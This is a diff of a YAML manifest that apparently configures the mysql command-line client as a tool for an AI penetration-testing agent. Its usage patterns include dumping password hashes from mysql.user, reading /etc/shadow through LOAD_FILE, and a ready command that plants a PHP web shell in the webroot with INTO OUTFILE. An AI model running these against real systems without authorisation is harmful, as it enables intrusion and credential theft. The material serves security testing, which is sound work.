@@ -1,18 +1,58 @@
 name: mysql
+kind: cli
+binary: mysql
 version: "8.0"
-description: "MySQL/MariaDB client (mysql CLI 8.0) for direct database access, enumeration, and data extraction. 5 methods: query (execute arbitrary SQL), list_databases (SHOW DATABASES), list_tables (SHOW TABLES in database), dump_table (SELECT with column filtering and row limit), find_credentials (auto-search for user/password columns across tables). Uses the mysql CLI with JSON output for structured results. Connects per-query (no persistent sessions)."
-image: "ghcr.io/silicon-works/mcp-tools-mysql:latest"
+description: >
+  Official MySQL/MariaDB command-line client for direct database connections,
+  enumeration, and data extraction. Single-binary `mysql` (the MariaDB client
+  is symlinked from the same package on Kali via `default-mysql-client` →
+  `mariadb-client`). Used for: connecting to a MySQL/MariaDB server with
+  recovered credentials, listing databases (SHOW DATABASES) and tables (SHOW
+  TABLES), dumping rows (SELECT * FROM ...), reading server-side files via
+  `LOAD_FILE()` when the auth user has FILE privilege, writing files via
+  `INTO OUTFILE` for SQLi-derived RCE, and arbitrary SQL via `-e <query>`.
+
+  Argv form: `mysql -h <host> [-P <port>] -u <user> [-p<password>|--password=<pass>]
+  [-D <database>] -e '<query>' [-N] [-s] [-B] [--ssl-mode=...] [<database>]`.
+  The CRITICAL gotcha is `-p<password>` has NO SPACE between `-p` and the
+  password value (impacket-style anomaly) — `mysql -h x -u root -p test`
+  parses `test` as the DEFAULT DATABASE positional, not the password, and
+  then prompts interactively for the password (which hangs in a container
+  with no stdin). The safe forms are `-pSecret` (no space) or
+  `--password=Secret` (equals sign). Both put the cleartext password on the
+  command line, visible in `ps` and the audit log — this is intrinsic to the
+  mysql client; there is no `--password-from-file` flag.
+
+  No native JSON output; agents request `-B` (batch / TSV) or `-N -s` (silent
+  no-headers) for parseable rows. The mariadb client variant supports
+  `--xml` for XML output. The legacy method handlers (query, list_databases,
+  list_tables, dump_table, find_credentials) auto-inherit run_cli from
+  BaseMCPServer (mcp-common 0.3.0); kind:cli is the new default. The five
+  methods are preserved as the legacy / rollback path.
+
+image: ghcr.io/silicon-works/mcp-tools-mysql:latest
 image_size_mb: 300
-timeout_seconds: 120
+
+# Dual-clock model — connection + simple query is sub-second; large dumps on
+# tables with millions of rows can take many minutes. idle catches a wedged
+# container (e.g. interactive prompt waiting for stdin); max_runtime is the
+# hard cap for genuine long queries on big tables.
+idle_timeout_seconds: 300       # 5 min silence == wedged (likely interactive prompt)
+max_runtime_seconds: 3600       # 1 h hard cap — covers worst-case full-table dumps
+timeout_seconds: 3600
+allow_multi_target: false       # one host per call
 
 capabilities:
   - database_enumeration
   - sql_query_execution
   - credential_extraction
   - data_exfiltration
+  - file_read_via_load_file
+  - file_write_via_into_outfile
 
 phases:
   - enumeration
+  - exploitation
   - post-exploitation
 
 requirements:
@@ -23,187 +63,344 @@ resources:
   memory_mb: 256
   cpu: 0.5
 
-# Routing hints for tool selection
 routing:
   use_for:
-    - "connect to MySQL or MariaDB and run SQL queries"
-    - "enumerate databases and tables on MySQL server"
-    - "extract credentials from MySQL user tables"
-    - "dump table contents from MySQL database"
-    - "find password hashes in MySQL database"
-    - "read files via MySQL LOAD_FILE function"
+    - "Connect to MySQL or MariaDB with recovered credentials and run SQL queries"
+    - "Enumerate databases (SHOW DATABASES) and tables (SHOW TABLES) on a MySQL/MariaDB server"
+    - "Extract password hashes from `mysql.user` (`SELECT user, authentication_string FROM mysql.user`)"
+    - "Dump application credentials from `users` / `accounts` / `wp_users` / similar tables"
+    - "Read server-side files via `SELECT LOAD_FILE('/etc/passwd')` when the auth user has FILE privilege"
+    - "Write server-side files via `SELECT ... INTO OUTFILE '/var/www/html/shell.php'` for SQLi-derived RCE"
+    - "Test SSL/TLS configuration of a MySQL server (`--ssl-mode=REQUIRED` / `=DISABLED`)"
+    - "Connect to a Unix socket (`-S /var/run/mysqld/mysqld.sock`) on a compromised host"
+    - "Verify discovered credentials work before pivoting to deeper enumeration"
+    - "Execute multi-statement queries (`-e 'SHOW DATABASES; SHOW VARIABLES LIKE %ssl%'`)"
   never_use_for:
-    - "SQL injection testing (use sqlmap)"
-    - "port scanning"
-    - "MongoDB or SQLite access"
+    - "SQL injection testing — use sqlmap (mysql client requires already-known credentials and direct port access)"
+    - "Port scanning to discover MySQL servers — use nmap with `-sV --script=mysql-info`"
+    - "MongoDB, Redis, PostgreSQL, MSSQL — different protocols, different clients (use mongosh, redis-cli, psql, mssql-cli / sqlcmd)"
+    - "SQLite — use the `sqlite3` CLI (different binary, different protocol — local file, not network)"
+    - "Brute-forcing MySQL passwords — use hydra mysql or netexec mysql (purpose-built for credential spraying)"
+    - "NoSQL injection — use curl with operator-injection payloads ($ne, $regex, $where) plus nuclei NoSQL templates"
   triggers:
     - "MySQL"
     - "MariaDB"
+    - "mysql client"
+    - "mysql -h"
     - "database query"
     - "SQL query"
+    - "SHOW DATABASES"
+    - "SHOW TABLES"
+    - "mysql.user"
+    - "authentication_string"
     - "database enumeration"
     - "port 3306"
     - "dump database"
+    - "dump table"
+    - "LOAD_FILE"
+    - "INTO OUTFILE"
+    - "FILE privilege"
+    - "MySQL credentials"
+    - "MariaDB credentials"
+  prefer_over: []
 
-methods:
-  query:
-    description: "Execute an arbitrary SQL query on a MySQL/MariaDB database. Returns results as an array of row objects with column names as keys. Supports SELECT, SHOW, DESCRIBE, and data modification queries. Output is JSON-parsed for structured results."
-    when_to_use: "For custom SQL queries beyond what the helper methods provide. Common pentest queries: (1) 'SELECT user, authentication_string FROM mysql.user' — dump MySQL user hashes, (2) 'SELECT LOAD_FILE(\"/etc/passwd\")' — read files via MySQL (requires FILE privilege), (3) 'SELECT @@version' — get MySQL version, (4) 'SHOW GRANTS FOR CURRENT_USER()' — check privileges, (5) 'SELECT * FROM information_schema.tables' — full schema enumeration. Use list_databases/list_tables/dump_table for standard enumeration instead."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MySQL server hostname or IP. Use '127.0.0.1' with tunnel forward for localhost-only databases."
-      username:
-        type: string
-        required: true
-        description: "MySQL username (e.g., 'root', 'admin', discovered user)."
-      password:
-        type: string
-        description: "MySQL password."
-      database:
-        type: string
-        description: "Database to USE before running the query. Omit for cross-database queries."
-      query:
-        type: string
-        required: true
-        description: "SQL query to execute. Semicolons handled automatically."
-      port:
-        type: integer
-        default: 3306
-        description: "MySQL port."
-      timeout:
-        type: integer
-        default: 30
-        description: "Query timeout in seconds."
-    returns:
-      rows:
-        type: array
-        description: "Query results as array of {column: value} objects."
-      row_count:
-        type: integer
-        description: "Number of rows returned."
+see_also:
+  - tool: sqlmap
+    reason: "Use sqlmap when the access path is HTTP-side SQL injection (input parameter → SQL query in the application). Use mysql client when you have direct port-3306 access AND credentials. They are complementary: sqlmap may hand you a hash from `mysql.user` or a useful CVE; mysql client lets you use those creds for direct enumeration without going through the web layer."
+  - tool: hydra
+    reason: "Use `hydra mysql -L users.txt -P passwords.txt <host>` to brute-force MySQL credentials. Once a credential pair is found, hand it off to mysql client for enumeration. hydra's mysql module is purpose-built for credential spraying — don't try to script credential brute-force with mysql client itself."
+  - tool: netexec
+    reason: "Use `netexec mysql -u <user> -p <pass> --query 'SHOW DATABASES' <host>` for credential spraying across multiple MySQL servers in parallel — netexec's mysql protocol module handles the spray loop. mysql client is single-host. Once a successful spray hit is found, mysql client is the deeper-enumeration tool."
+  - tool: nmap
+    reason: "Use `nmap -p 3306 -sV --script=mysql-info,mysql-empty-password,mysql-users,mysql-databases <host>` to fingerprint MySQL/MariaDB version and try anonymous access BEFORE attempting credentialed connection. nmap's mysql NSE scripts surface version, default databases, and empty-password reachability without auth."
+  - tool: john
+    reason: "After dumping `authentication_string` from `mysql.user`, hashes are MySQL-format (`*HEX` for legacy, sha256 / caching_sha2 for MySQL 8+). Use `john --format=mysql-sha1` for the legacy form or hashcat mode 300 / 7401. mysql client extracts the hashes; john / hashcat crack them."
 
-  list_databases:
-    description: "List all databases on the MySQL server (SHOW DATABASES). Filters out system databases or includes them based on context."
-    when_to_use: "First step after gaining MySQL credentials. Shows all databases — look for application databases (wordpress, drupal, custom_app) vs system databases (mysql, information_schema, performance_schema, sys). Application databases often contain user credentials."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MySQL server hostname or IP."
-      username:
-        type: string
-        required: true
-        description: "MySQL username."
-      password:
-        type: string
-        description: "MySQL password."
-      port:
-        type: integer
-        default: 3306
-        description: "MySQL port."
-    returns:
-      databases:
-        type: array
-        description: "List of database names."
+# ── kind:cli specific sections ──────────────────────────────────────
 
-  list_tables:
-    description: "List all tables in a specific database (SHOW TABLES)."
-    when_to_use: "After identifying an interesting database via list_databases. Look for tables named: users, accounts, credentials, admins, members, auth, sessions — these likely contain credentials. Also look for: posts, comments, messages — may contain sensitive data."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MySQL server hostname or IP."
-      username:
-        type: string
-        required: true
-        description: "MySQL username."
-      password:
-        type: string
-        description: "MySQL password."
-      database:
-        type: string
-        required: true
-        description: "Database name to list tables from."
-      port:
-        type: integer
-        default: 3306
-        description: "MySQL port."
-    returns:
-      tables:
-        type: array
-        description: "List of table names in the database."
+target_extraction:
+  # The mysql binary takes the host via -h (single-dash short flag) or
+  # --host=<host> (double-dash long form with equals OR space). The first
+  # positional, when supplied, is a DATABASE NAME (sets the default DB) —
+  # NOT a host. Examples:
+  #   mysql -h 10.10.10.5 -u root -ptest -e 'SELECT 1'
+  #   mysql --host=10.10.10.5 -u root -ptest -e 'SELECT 1'
+  #   mysql -h 10.10.10.5 -u root -ptest mydb       # mydb is the DB, not the host
+  #
+  # Precedence (first match wins):
+  #   1. flag_value -h        — short flag (the canonical form)
+  #   2. flag_value --host    — long flag (rare in practice)
+  #
+  # We do NOT use first_non_flag_positional — the first positional is a
+  # database name, and treating it as the target would corrupt the
+  # engagement scope.
+  - rule: "flag_value"
+    flag: "-h"
+    parse_as: "raw"
+  - rule: "flag_value"
+    flag: "--host"
+    parse_as: "raw"
 
-  dump_table:
-    description: "Dump contents of a specific table with optional column filtering and row limit (default 100 rows). Builds a SELECT query from the parameters."
-    when_to_use: "To extract data from a table identified via list_tables or find_credentials. Use columns param to select only relevant columns (e.g., columns=['username','password'] to avoid dumping large text fields). Increase limit for full extraction. For large tables, use query method with specific WHERE clauses instead."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MySQL server hostname or IP."
-      username:
-        type: string
-        required: true
-        description: "MySQL username."
-      password:
-        type: string
-        description: "MySQL password."
-      database:
-        type: string
-        required: true
-        description: "Database name."
-      table:
-        type: string
-        required: true
-        description: "Table name to dump."
-      columns:
-        type: array
-        description: "Specific columns to select (e.g., ['username', 'password', 'email']). Omit for SELECT *."
-      limit:
-        type: integer
-        default: 100
-        description: "Maximum number of rows to return."
-      port:
-        type: integer
-        default: 3306
-        description: "MySQL port."
-    returns:
-      data:
-        type: array
-        description: "Table rows as array of {column: value} objects."
-      row_count:
-        type: integer
-        description: "Number of rows returned."
+# mysql has no bulk-target ingest flag — single host per call. Nothing to
+# reject at the flag layer for scope reasons. The `-p<password>` no-space
+# convention is a major footgun (puts cleartext on the command line, visible
+# in `ps`) but `--password=value` has the same exposure. Both forms are the
+# only non-interactive ways to pass a password — there is no
+# `--password-from-file` or `MYSQL_PWD` env-only flag (well, `MYSQL_PWD` env
+# var works but is also visible in /proc/<pid>/environ). NOT a reject — both
+# are dual-use; document via gotchas instead.
+reject_flags: []
+reject_flags_reason: "mysql client has no bulk-target ingest flag. Single host per call. Cleartext-password-on-cmdline is intrinsic to the tool (no --password-from-file alternative exists); flagged as a gotcha rather than a reject because it is the only practical way to script the client."
 
-  find_credentials:
-    description: "Automatically search for tables containing credential-like data across one or all databases. Looks for tables with columns named: user, username, login, email, password, pass, pwd, hash, secret, token. Dumps matching rows."
-    when_to_use: "Quick credential discovery — faster than manually checking each table. Run this first after list_databases to find low-hanging fruit. Found hashes can be cracked with john or looked up via hash-lookup. Specify database to narrow the search, or omit to scan all accessible databases."
-    params:
-      host:
-        type: string
-        required: true
-        description: "MySQL server hostname or IP."
-      username:
-        type: string
-        required: true
-        description: "MySQL username."
-      password:
-        type: string
-        description: "MySQL password."
-      database:
-        type: string
-        description: "Database to search. Omit to search all accessible databases."
-      port:
-        type: integer
-        default: 3306
-        description: "MySQL port."
-    returns:
-      tables:
-        type: array
-        description: "Tables containing credential-like columns."
-      credentials:
-        type: array
-        description: "Extracted rows with username/password/hash data."
+# Per-tool value-taking flags whose values must NOT be confused with
+# positional targets. Verified against `mysql --help` (MariaDB 11.x and
+# MySQL 8.x — both use the same flag set for the canonical options).
+value_flags:
+  # ── Connection ──
+  - "-h"                          # short host
+  - "--host"                      # long host
+  - "-P"                          # short port (CAPITAL P — lowercase -p is password)
+  - "--port"                      # long port
+  - "-u"                          # short user
+  - "--user"                      # long user
+  - "--password"                  # long password (--password=value or interactive)
+  # NOTE: -p has NO SPACE between flag and value (`-pSecret`); cli_in_container's
+  # parser treats it as a value-taking flag with the value glued in. Listed for
+  # safety in case any callsite synthesizes `-p value` (which would be wrong).
+  - "-p"
+  - "-S"                          # short socket path
+  - "--socket"                    # long socket path
+  - "--protocol"                  # connection protocol (TCP|SOCKET|PIPE|MEMORY)
+  - "--bind-address"              # local bind address (multi-homed hosts)
+  # ── Default DB & query ──
+  - "-D"                          # default database
+  - "--database"                  # long default database
+  - "-e"                          # execute query (single string)
+  - "--execute"                   # long execute
+  - "--init-command"              # query run at connect time
+  - "--prompt"                    # interactive prompt format
+  - "--default-character-set"     # client charset (utf8mb4 typical)
+  # ── SSL/TLS ──
+  - "--ssl-mode"                  # DISABLED|PREFERRED|REQUIRED|VERIFY_CA|VERIFY_IDENTITY
+  - "--ssl-ca"                    # path to CA cert
+  - "--ssl-cert"                  # path to client cert
+  - "--ssl-key"                   # path to client key
+  - "--ssl-cipher"                # allowed cipher list
+  - "--ssl-capath"                # CA cert directory
+  - "--ssl-crl"                   # CRL file
+  - "--ssl-crlpath"               # CRL directory
+  - "--tls-version"               # min TLS version
+  # ── Output formatting (boolean — listed for safety in case any tool emits
+  # `-N true` etc.; correct usage is bare flag with no value) ──
+  - "-N"                          # skip column names (boolean)
+  - "--skip-column-names"
+  - "-s"                          # silent mode (boolean — also -ss for terser)
+  - "--silent"
+  - "-B"                          # batch mode / TSV (boolean)
+  - "--batch"
+  - "-r"                          # raw output (no escape conversion)
+  - "--raw"
+  - "-i"                          # ignore spaces (boolean)
+  - "--ignore-spaces"
+  - "--xml"                       # XML output (mariadb client only)
+  # ── Defaults files ──
+  - "--defaults-file"             # alternative my.cnf path
+  - "--defaults-extra-file"       # additional my.cnf path
+  - "--defaults-group-suffix"     # config section suffix
+
+usage_patterns:
+  - name: "Version check / smoke test"
+    command: "mysql -h {host} -u {user} -p{password} -e 'SELECT VERSION()'"
+    when: "Confirm the credential pair works and surface the server version. Use this as the first call after recovering creds — fast (<1s round-trip) and surfaces version-specific exploit paths (e.g., MySQL 5.x → CVE-2012-2122 auth bypass historically; MySQL 8.x → caching_sha2 vs mysql_native_password). VERSION() is universally available — works against MySQL, MariaDB, Percona, AWS RDS."
+
+  - name: "List databases"
+    command: "mysql -h {host} -u {user} -p{password} -e 'SHOW DATABASES'"
+    when: "Surface the list of databases on the server — first enumeration step. System databases (information_schema, mysql, performance_schema, sys) are visible to any authenticated user; application databases (wordpress, app_db, backend) only show up if the auth user has at least USAGE privilege on them. SHOW DATABASES respects per-user grant scoping — root sees all, an app user may see only its app DB."
+
+  - name: "List tables in a database"
+    command: "mysql -h {host} -u {user} -p{password} -D {database} -e 'SHOW TABLES'"
+    when: "After `SHOW DATABASES`, drill into a specific application database to find credential-bearing tables. Common patterns: `users`, `accounts`, `members`, `wp_users` (WordPress), `auth_user` (Django), `tbl_users` / `tblusers`. Use -D to set the default DB; alternative: `mysql -h x -u y -pz {database}` (positional)."
+
+  - name: "Dump a table in batch / TSV format"
+    command: "mysql -h {host} -u {user} -p{password} -D {database} -e 'SELECT * FROM {table} LIMIT 100' -B"
+    when: "Pull rows from a target table. -B (batch mode) outputs tab-separated values with column headers as the first row — easy to parse line-by-line. Combine with -N to suppress headers when piping to wc / awk. For sensitive credential dumps, pin specific columns: `SELECT user, authentication_string FROM mysql.user` instead of SELECT *."
+
+  - name: "Dump password hashes from mysql.user (post-exploit)"
+    command: "mysql -h {host} -u root -p{root_password} -e 'SELECT user, host, authentication_string FROM mysql.user' -B -N"
+    when: "After gaining root@localhost on the MySQL server, dump the user/hash pairs for offline cracking. authentication_string is the column in MySQL 5.7+ (was Password in 5.6 and earlier — fall back to `SELECT user, host, password FROM mysql.user` on older servers). Hash format depends on plugin: mysql_native_password = `*40HEX` (MySQL-SHA1, john --format=mysql-sha1, hashcat 300); caching_sha2_password = `$A$005$...` (hashcat 7401)."
+
+  - name: "Read server-side file via LOAD_FILE (FILE privilege required)"
+    command: "mysql -h {host} -u {user} -p{password} -e \"SELECT LOAD_FILE('/etc/passwd')\""
+    when: "Read arbitrary files readable by the mysqld process when the auth user has the FILE privilege (`SHOW GRANTS FOR CURRENT_USER()` to verify). LOAD_FILE returns NULL on permission denied or path outside `secure_file_priv`. Common targets: `/etc/passwd`, `/etc/shadow` (if mysqld runs as root), `/var/www/html/config.php`, `/root/.ssh/authorized_keys`. NB: from MySQL 5.7.6 forward, `secure_file_priv` is set by default and confines LOAD_FILE to a single directory."
+
+  - name: "Write web shell via INTO OUTFILE (FILE privilege + writable webroot required)"
+    command: "mysql -h {host} -u {user} -p{password} -e \"SELECT '<?php system(\\$_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php'\""
+    when: "SQLi-derived RCE: write server-side file via mysqld's INTO OUTFILE. Requires FILE privilege AND that mysqld can write to the destination directory AND `secure_file_priv` is empty or set to the destination's parent. The path is from the MYSQLD'S perspective on the SERVER, not the client. Note shell escaping: `\\$` to keep the dollar literal in shell; `<?php` survives single-quoting. Default secure_file_priv on Debian/Ubuntu mysql packages is `/var/lib/mysql-files/` — files outside fail silently."
+
+  - name: "SSL-required connection"
+    command: "mysql -h {host} -u {user} -p{password} --ssl-mode=REQUIRED -e 'SELECT 1'"
+    when: "When the MySQL server enforces SSL (require_secure_transport=ON, MySQL 8 default for caching_sha2). --ssl-mode=REQUIRED forces TLS without verifying the server cert (lab-friendly). For production-grade verification: --ssl-mode=VERIFY_CA --ssl-ca=/path/to/ca.pem. To FORCE plaintext when the server allows it: --ssl-mode=DISABLED (often needed for legacy MySQL 5.x targets where the client defaults to ssl-on)."
+
+  - name: "Connection via Unix socket (post-compromise on the DB host)"
+    command: "mysql -S {socket_path} -u {user} -p{password} -e 'SELECT VERSION()'"
+    when: "When you have a shell on the database host and want to skip TCP/3306 entirely — Unix socket connection bypasses any TCP-side firewall rules and may use socket-auth (auth_socket plugin) which trusts the OS user. Common paths: /var/run/mysqld/mysqld.sock (Debian/Ubuntu), /tmp/mysql.sock (RHEL/CentOS), /var/lib/mysql/mysql.sock (custom). Pair with -u root to try the auth_socket implicit-trust path on Debian-style installs."
+
+  - name: "Multi-statement query via -e with semicolons"
+    command: "mysql -h {host} -u {user} -p{password} -e 'SHOW VARIABLES LIKE \"%ssl%\"; SHOW VARIABLES LIKE \"%secure_file_priv%\"; SHOW GRANTS FOR CURRENT_USER()' -B"
+    when: "Compress multiple SHOW / SELECT / DESCRIBE calls into one round-trip. mysql parses semicolons inside -e and executes each statement sequentially. Output sections are concatenated; use distinguishing column names per query to demarcate. Useful for the post-auth fingerprint sweep: ssl-mode, secure_file_priv, GRANTS — all in one call."
+
+  - name: "Suppress headers and silent mode (clean parseable output)"
+    command: "mysql -h {host} -u {user} -p{password} -D {database} -e 'SELECT user, password FROM users' -B -N -s"
+    when: "For piping to other tools (awk, grep, john --stdin). -B = batch (TSV), -N = skip column names, -s = silent (suppress 'rows in set' footer). Combined gives raw TSV rows ready for further processing. -s is repeatable (-ss for even terser)."
+
+  - name: "Default database via positional (alternate to -D)"
+    command: "mysql -h {host} -u {user} -p{password} {database} -e 'SHOW TABLES'"
+    when: "MySQL accepts the database name as a positional argument as a shortcut for -D. Used as the alternative form. NB: this is exactly the pitfall behind the `-p<password>` no-space rule — `mysql -h x -u root -p test` interprets `test` as this positional database name (NOT the password) and prompts interactively for the password (which hangs in a no-stdin container)."
+
+  - name: "Defaults file (~/.my.cnf) handling"
+    command: "mysql --no-defaults -h {host} -u {user} -p{password} -e 'SELECT 1'"
+    when: "When the container or operator's home has a ~/.my.cnf or /etc/mysql/my.cnf with credentials/options that conflict with the explicit args. --no-defaults tells mysql to ignore ALL config files. Important inside containers — the official mysql image may carry a preset client config that overrides --ssl-mode or --user."
+
+  - name: "Verbose mode (debug connection failure)"
+    command: "mysql -h {host} -u {user} -p{password} -v -v -v -e 'SELECT 1'"
+    when: "When a connection or query fails with terse stderr — repeat -v up to three times for progressively more verbose output (-v = print queries; -vv = print result info; -vvv = print full debug). Useful for diagnosing TLS handshake failures, character set mismatches, and protocol negotiation issues."
+
+  - name: "XML output (mariadb client only)"
+    command: "mysql -h {host} -u {user} -p{password} --xml -e 'SELECT * FROM mysql.user' -D mysql"
+    when: "When the agent needs structured output and the container has the mariadb client variant (default on Kali via `mariadb-client`). --xml emits a `<resultset>` document; useful for schema-aware parsing. NOT available in Oracle MySQL client. Test with `mysql --version` — `mysql Ver ... MariaDB ...` indicates mariadb client."
+
+  - name: "Init command (run at connect time)"
+    command: "mysql -h {host} -u {user} -p{password} --init-command='SET SESSION group_concat_max_len=1000000' -e 'SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=\"{database}\"' -B"
+    when: "Run a setup query (SET, USE) before the main -e query in a single connection. Common use: bump group_concat_max_len before a heavy GROUP_CONCAT to avoid truncation; SET NAMES utf8mb4 for non-Latin charset tables; SET SQL_BIG_SELECTS=1 to bypass the default scan-limit."
+
+output_formats:
+  - flag: "-B"
+    format: "tsv"
+    preferred: true
+    notes: "Batch mode — tab-separated values with column headers on first row. The most parseable form; combine with -N to drop headers."
+  - flag: "-N"
+    format: "tsv_no_header"
+    preferred: false
+    notes: "Skip column names. Combine with -B for headerless TSV. Pair with -s for headerless + no-footer."
+  - flag: "-s"
+    format: "silent"
+    preferred: false
+    notes: "Suppress 'rows in set' footer. Repeat (-ss) for even terser output."
+  - flag: "--xml"
+    format: "xml"
+    preferred: false
+    notes: "XML resultset — mariadb client only (Kali default). Not available in Oracle MySQL client. Useful for schema-aware parsing; converts to JSON via xq / jq."
+  - flag: ""
+    format: "text"
+    preferred: false
+    notes: "Default — pretty ASCII table with box-drawing characters. Human-readable but a pain to parse. Use -B / -N / -s for scripting."
+
+common_options:
+  connection:
+    - "-h HOST | --host=HOST: MySQL server hostname or IP. Use IP for unreliable DNS in containers."
+    - "-P PORT | --port=PORT: TCP port (default 3306). NB: CAPITAL P — lowercase -p is the password flag (different semantics)."
+    - "-u USER | --user=USER: MySQL username (e.g., root, admin, app_user)."
+    - "-pPASSWORD | --password=PASSWORD: Password. CRITICAL: -p has NO SPACE between flag and value (`-pSecret`). `-p Secret` parses Secret as the default DATABASE positional and prompts interactively (which hangs in containers)."
+    - "-S PATH | --socket=PATH: Unix socket path. Bypasses TCP entirely; use when shelled on the DB host."
+    - "--protocol=TCP|SOCKET|PIPE|MEMORY: Force connection protocol. Default chooses TCP for -h, SOCKET for localhost without -h."
+  execution:
+    - "-e 'QUERY' | --execute='QUERY': Execute single query non-interactively and exit. CRITICAL: without -e, mysql opens an interactive prompt that hangs in a container (no stdin)."
+    - "-D DB | --database=DB: Default database (USE). Alternative: positional `<database>` after auth flags."
+    - "--init-command='QUERY': Run QUERY at connect time before -e. Useful for SET SESSION / SET NAMES."
+    - "<DATABASE>: Positional database name (alternate to -D). PITFALL: `-p test` parses `test` as this positional, not the password value."
+  output:
+    - "-B | --batch: Tab-separated output, suitable for scripts."
+    - "-N | --skip-column-names: Suppress column header row."
+    - "-s | --silent: Suppress 'rows in set' footer. Repeat (-ss) for terser."
+    - "-r | --raw: No backslash-escape conversion in output (binary-safe)."
+    - "--xml: XML resultset (mariadb client only)."
+  ssl:
+    - "--ssl-mode=DISABLED|PREFERRED|REQUIRED|VERIFY_CA|VERIFY_IDENTITY: TLS mode. DISABLED forces plaintext (legacy targets); REQUIRED forces TLS without cert verification (lab); VERIFY_CA validates server cert."
+    - "--ssl-ca=PATH: CA cert for server verification (with VERIFY_CA / VERIFY_IDENTITY)."
+    - "--ssl-cert=PATH --ssl-key=PATH: Client cert + key for mutual TLS."
+    - "--tls-version=TLSv1.2,TLSv1.3: Restrict TLS version. Newer MySQL 8 servers drop TLS 1.0 / 1.1."
+  defaults_files:
+    - "--no-defaults: Ignore ALL config files (~/.my.cnf, /etc/my.cnf). Use to avoid surprise overrides inside containers."
+    - "--defaults-file=PATH: Read ONLY this config file."
+    - "--defaults-extra-file=PATH: Read this config IN ADDITION to default search."
+
+gotchas:
+  - "PASSWORD FLAG HAS NO SPACE — `-p<password>` is the canonical form (`-pSecret`, NOT `-p Secret`). With a space, mysql parses the value as the DEFAULT DATABASE positional argument and then prompts interactively for the password — which hangs forever in a container with no stdin. The long form `--password=Secret` (equals sign) also works. Both forms expose the password in `ps` output. There is NO `--password-from-file` flag and NO `--password-prompt` non-interactive alternative; the closest workaround is `MYSQL_PWD=Secret mysql -h ...` env-var, but MYSQL_PWD is also visible via /proc/<pid>/environ on Linux."
+  - "DEFAULT PORT IS 3306, USE -P (CAPITAL P) TO OVERRIDE — lowercase -p is the PASSWORD flag, not the port flag. Common typo: `mysql -h host -p 3307 -u root` parses `3307` as the database (and prompts for password). Correct: `mysql -h host -P 3307 -u root -pSecret`."
+  - "WITHOUT -e, MYSQL OPENS INTERACTIVE PROMPT — the container has no stdin, so mysql blocks forever waiting for input. ALWAYS pass `-e '<query>'` (or `--execute='<query>'`) for non-interactive batch use. There is no `--non-interactive` flag; -e IS the non-interactive escape."
+  - "MULTI-STATEMENT QUERIES WORK VIA SEMICOLONS IN -e — `mysql -e 'SHOW DATABASES; SHOW VARIABLES'`. Each statement is executed sequentially over the same connection. Output sections are concatenated; use distinct column names per query to demarcate. Alternative: `--init-command='SETUP_QUERY' -e 'MAIN_QUERY'` runs SETUP_QUERY at connect time before MAIN_QUERY."
+  - "LOAD_FILE REQUIRES FILE PRIVILEGE ON THE SERVER — non-root users typically lack this; verify with `SHOW GRANTS FOR CURRENT_USER()`. Even with FILE, `secure_file_priv` (a server variable) confines reads to a single directory (default `/var/lib/mysql-files/` on Debian-style packages). `SELECT LOAD_FILE('/etc/passwd')` returns NULL on either permission denied or out-of-scope path — distinguish via `SHOW VARIABLES LIKE 'secure_file_priv'`."
+  - "INTO OUTFILE WRITES SERVER-SIDE FILES — the path is from the MYSQLD process's perspective on the SERVER, not the client. Common confusion: `SELECT '...' INTO OUTFILE '/tmp/x'` writes to the server's /tmp, not the client's. Requires FILE privilege AND `secure_file_priv` permits the destination directory AND mysqld has filesystem write access there. Default secure_file_priv on Debian: `/var/lib/mysql-files/`. Default on stock builds: empty (anywhere mysqld can write — including /var/www/ for web shell drops)."
+  - "SSL ENFORCED BY DEFAULT IN MYSQL 8+ — caching_sha2_password (the MySQL 8 default auth plugin) requires either TLS or RSA-encrypted password exchange. Connecting to a legacy 5.7-style server from a MySQL 8 client may fail with `SSL connection error: protocol version mismatch` — pass `--ssl-mode=DISABLED` to force plaintext for legacy targets. Conversely, MySQL 8 servers often have `require_secure_transport=ON` — pass `--ssl-mode=REQUIRED`."
+  - "DEFAULTS FILES CAN OVERRIDE EXPLICIT FLAGS — `~/.my.cnf` and `/etc/mysql/my.cnf` are read by default. A `[client]` section with `password=foo` will override `-pBar` in some mysql versions. Pass `--no-defaults` first to ignore all config files, or `--defaults-file=/dev/null` for the same effect. Critical inside containers — the kalilinux/kali-rolling base may carry a preset config."
+  - "MARIADB CLIENT VS MYSQL CLIENT — `default-mysql-client` on Kali installs the MariaDB client (`mysql` binary is symlink to `mariadb`). Most flags are identical, but XML output (`--xml`), `--abort-source-on-error`, and a few others are MariaDB-only. Verify with `mysql --version`: `mysql Ver 15.1 Distrib 10.11.4-MariaDB` indicates mariadb client; `mysql Ver 8.0.34 for Linux` indicates Oracle MySQL client."
+  - "AUTHENTICATION_STRING IS THE HASH COLUMN IN MYSQL 5.7+ — older guides say `password` (which was the column in 5.6 and earlier). On 5.7+, the column was renamed to `authentication_string`. Both Oracle MySQL and MariaDB share the new name. Older legacy-mode forks may still expose `password` — `DESCRIBE mysql.user` to confirm column name before dumping."
+  - "HASH FORMAT VARIES BY auth_plugin — `mysql_native_password` produces `*40HEX` (40-char hex prefixed with asterisk; john --format=mysql-sha1, hashcat 300). `caching_sha2_password` (MySQL 8 default) produces `$A$005$...` (hashcat 7401). `sha256_password` produces a different SHA256 form. `auth_socket` has empty / NULL hash and trusts the OS user. `SELECT user, plugin, authentication_string FROM mysql.user` to see all three at once."
+  - "POSITIONAL DATABASE OVERRIDES -D — `mysql -h x -u y -pz -D admin_db users_db -e '...'` uses `users_db` (the LAST positional). The first positional after auth flags wins if -D is also present? Actually NO: -D and the positional both set the default DB; if both, the LAST one wins. Practical advice: use ONE method (-D OR positional), not both."
+  - "UNIX SOCKET PATH IS HOST-SPECIFIC — `/var/run/mysqld/mysqld.sock` (Debian/Ubuntu/Kali default), `/tmp/mysql.sock` (RHEL/CentOS), `/var/lib/mysql/mysql.sock` (some custom). On Kali, the actual installed server (if any) uses Debian path. Inside the mcp-tools mysql container, there is NO local mysqld — -S is only useful when the container has been set up to bind-mount the host's socket OR with a different host's socket transferred via a tunnel."
